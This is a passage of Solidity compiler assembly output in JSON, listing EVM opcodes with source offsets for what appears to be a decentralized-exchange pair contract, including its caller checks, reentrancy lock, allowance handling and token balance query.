											"value": "7"
										},
										{
											"begin": 2617,
											"end": 2624,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2617,
											"end": 2624,
											"name": "AND"
										},
										{
											"begin": 2603,
											"end": 2613,
											"name": "CALLER"
										},
										{
											"begin": 2603,
											"end": 2624,
											"name": "EQ"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH [tag]",
											"value": "185"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "JUMPI"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP1"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP2"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MSTORE"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP3"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "ADD"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MSTORE"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP3"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "ADD"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "2830B731B0B5B29D102327A92124A22222A7"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "71"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP3"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "ADD"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MSTORE"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "SWAP1"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "MLOAD"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "SWAP1"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "DUP2"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "SWAP1"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "SUB"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "ADD"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "SWAP1"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "REVERT"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "tag",
											"value": "185"
										},
										{
											"begin": 2595,
											"end": 2647,
											"name": "JUMPDEST"
										},
										{
											"begin": 2677,
											"end": 2683,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "DUP1"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SWAP5"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "DUP6"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "AND"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SWAP2"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "DUP3"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "AND"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "OR"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SWAP1"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SWAP2"
										},
										{
											"begin": 2677,
											"end": 2693,
											"name": "SSTORE"
										},
										{
											"begin": 2703,
											"end": 2709,
											"name": "PUSH",
											"value": "9"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "DUP1"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SLOAD"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP4"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP1"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP5"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "AND"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP3"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "AND"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP2"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP1"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP2"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "OR"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP1"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SWAP2"
										},
										{
											"begin": 2703,
											"end": 2719,
											"name": "SSTORE"
										},
										{
											"begin": 2729,
											"end": 2735,
											"name": "PUSH",
											"value": "A"
										},
										{
											"begin": 2729,
											"end": 2745,
											"name": "SSTORE"
										},
										{
											"begin": 2478,
											"end": 2752,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "tag",
											"value": "64"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMPDEST"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "SLOAD"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "DUP2"
										},
										{
											"begin": 307,
											"end": 333,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "tag",
											"value": "67"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "AND"
										},
										{
											"begin": 3219,
											"end": 3223,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3248,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP1"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "DUP4"
										},
										{
											"begin": 3239,
											"end": 3254,
											"name": "KECCAK256"
										},
										{
											"begin": 3255,
											"end": 3265,
											"name": "CALLER"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP5"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP1"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SWAP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "MSTORE"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "DUP2"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "KECCAK256"
										},
										{
											"begin": 3239,
											"end": 3266,
											"name": "SLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "NOT"
										},
										{
											"begin": 3239,
											"end": 3281,
											"name": "EQ"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "PUSH [tag]",
											"value": "187"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPI"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3336,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP2"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP1"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3342,
											"name": "KECCAK256"
										},
										{
											"begin": 3343,
											"end": 3353,
											"name": "CALLER"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "DUP5"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP2"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "MSTORE"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SWAP1"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "KECCAK256"
										},
										{
											"begin": 3327,
											"end": 3354,
											"name": "SLOAD"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH [tag]",
											"value": "188"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "SWAP1"
										},
										{
											"begin": 3376,
											"end": 3381,
											"name": "DUP4"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "PUSH",
											"value": "FFFFFFFF"
										},
										{
											"begin": 3327,
											"end": 3358,
											"name": "PUSH [tag]",
											"value": "170"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "AND"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "tag",
											"value": "188"
										},
										{
											"begin": 3327,
											"end": 3395,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP6"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "AND"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3306,
											"name": "PUSH",
											"value": "2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP2"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP1"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "DUP4"
										},
										{
											"begin": 3297,
											"end": 3312,
											"name": "KECCAK256"
										},
										{
											"begin": 3313,
											"end": 3323,
											"name": "CALLER"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "DUP5"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP2"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "MSTORE"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "SWAP1"
										},
										{
											"begin": 3297,
											"end": 3324,
											"name": "KECCAK256"
										},
										{
											"begin": 3297,
											"end": 3395,
											"name": "SSTORE"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "tag",
											"value": "187"
										},
										{
											"begin": 3235,
											"end": 3406,
											"name": "JUMPDEST"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "PUSH [tag]",
											"value": "189"
										},
										{
											"begin": 3425,
											"end": 3429,
											"name": "DUP5"
										},
										{
											"begin": 3431,
											"end": 3433,
											"name": "DUP5"
										},
										{
											"begin": 3435,
											"end": 3440,
											"name": "DUP5"
										},
										{
											"begin": 3415,
											"end": 3424,
											"name": "PUSH [tag]",
											"value": "190"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "tag",
											"value": "189"
										},
										{
											"begin": 3415,
											"end": 3441,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 3458,
											"end": 3462,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP4"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "SWAP3"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "POP"
										},
										{
											"begin": 3108,
											"end": 3469,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "tag",
											"value": "69"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMPDEST"
										},
										{
											"begin": 706,
											"end": 772,
											"name": "PUSH",
											"value": "6E71EDAE12B1B97F4D1F60370FEF10105FA2FAAE0126114A169C64845D6126C9"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "DUP2"
										},
										{
											"begin": 656,
											"end": 772,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "tag",
											"value": "71"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMPDEST"
										},
										{
											"begin": 299,
											"end": 301,
											"name": "PUSH",
											"value": "12"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "DUP2"
										},
										{
											"begin": 266,
											"end": 301,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "tag",
											"value": "73"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMPDEST"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "SLOAD"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "DUP2"
										},
										{
											"begin": 515,
											"end": 546,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "tag",
											"value": "76"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMPDEST"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "3"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "MSTORE"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SWAP1"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "KECCAK256"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "SLOAD"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "DUP2"
										},
										{
											"begin": 459,
											"end": 508,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "tag",
											"value": "78"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMPDEST"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "PUSH",
											"value": "C"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "SLOAD"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "DUP2"
										},
										{
											"begin": 934,
											"end": 966,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "tag",
											"value": "80"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMPDEST"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "PUSH",
											"value": "D"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "SLOAD"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "DUP2"
										},
										{
											"begin": 972,
											"end": 1004,
											"name": "JUMP",
											"value": "[out]"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "tag",
											"value": "83"
										},
										{
											"begin": 4905,
											"end": 6170,
											"name": "JUMPDEST"
										},
										{
											"begin": 4954,
											"end": 4968,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1179,
											"end": 1187,
											"name": "SLOAD"
										},
										{
											"begin": 1191,
											"end": 1192,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": 1179,
											"end": 1192,
											"name": "EQ"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH [tag]",
											"value": "192"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPI"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "461BCD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E5"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "14185B98D85AD94E881313D0D2D151"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "8A"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "44"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP3"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MSTORE"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "MLOAD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "DUP2"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SUB"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "PUSH",
											"value": "64"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "ADD"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "SWAP1"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "REVERT"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "tag",
											"value": "192"
										},
										{
											"begin": 1171,
											"end": 1212,
											"name": "JUMPDEST"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 1222,
											"end": 1230,
											"name": "PUSH",
											"value": "F"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "DUP2"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SWAP1"
										},
										{
											"begin": 1222,
											"end": 1234,
											"name": "SSTORE"
										},
										{
											"begin": 1233,
											"end": 1234,
											"name": "DUP1"
										},
										{
											"begin": 5023,
											"end": 5036,
											"name": "PUSH [tag]",
											"value": "194"
										},
										{
											"begin": 5023,
											"end": 5034,
											"name": "PUSH [tag]",
											"value": "54"
										},
										{
											"begin": 5023,
											"end": 5036,
											"name": "JUMP",
											"value": "[in]"
										},
										{
											"begin": 5023,
											"end": 5036,
											"name": "tag",
											"value": "194"
										},
										{
											"begin": 5023,
											"end": 5036,
											"name": "JUMPDEST"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "PUSH",
											"value": "8"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "SLOAD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "40"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MLOAD"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "E0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP2"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MSTORE"
										},
										{
											"begin": 5110,
											"end": 5114,
											"name": "ADDRESS"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "4"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "ADD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MSTORE"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "MLOAD"
										},
										{
											"begin": 4980,
											"end": 5036,
											"name": "SWAP4"
										},
										{
											"begin": 4980,
											"end": 5036,
											"name": "SWAP6"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 4980,
											"end": 5036,
											"name": "SWAP2"
										},
										{
											"begin": 4980,
											"end": 5036,
											"name": "SWAP4"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "POP"
										},
										{
											"begin": 5061,
											"end": 5074,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 5061,
											"end": 5074,
											"name": "SWAP3"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "1"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "PUSH",
											"value": "A0"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SHL"
										},
										{
											"begin": -1,
											"end": -1,
											"name": "SUB"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "SWAP1"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "SWAP2"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "AND"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "SWAP2"
										},
										{
											"begin": 5077,
											"end": 5101,
											"name": "PUSH",
											"value": "70A08231"
										},
										{
											"begin": 5077,
											"end": 5101,
											"name": "SWAP2"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "24"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP4"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "ADD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "PUSH",
											"value": "20"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP2"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP3"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SWAP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "SUB"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "ADD"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP2"
										},
										{
											"begin": 5084,
											"end": 5090,
											"name": "DUP7"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "DUP1"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "EXTCODESIZE"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "PUSH [tag]",
											"value": "195"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPI"
										},
										{
											"begin": 30,
											"end": 31,
											"name": "PUSH",
											"value": "0"
										},
										{
											"begin": 27,
											"end": 28,
											"name": "DUP1"
										},
										{
											"begin": 20,
											"end": 32,
											"name": "REVERT"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "tag",
											"value": "195"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "JUMPDEST"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "POP"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "GAS"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "STATICCALL"
										},
										{
											"begin": 5077,
											"end": 5116,
											"name": "ISZERO"
										},
										{
											"begin": 8,
											"end": 17,
											"name": "DUP1"
										},
										{
											"begin": 5,
											"end": 7,
											"name": "ISZERO"
										},
										{
											"begin": 5,
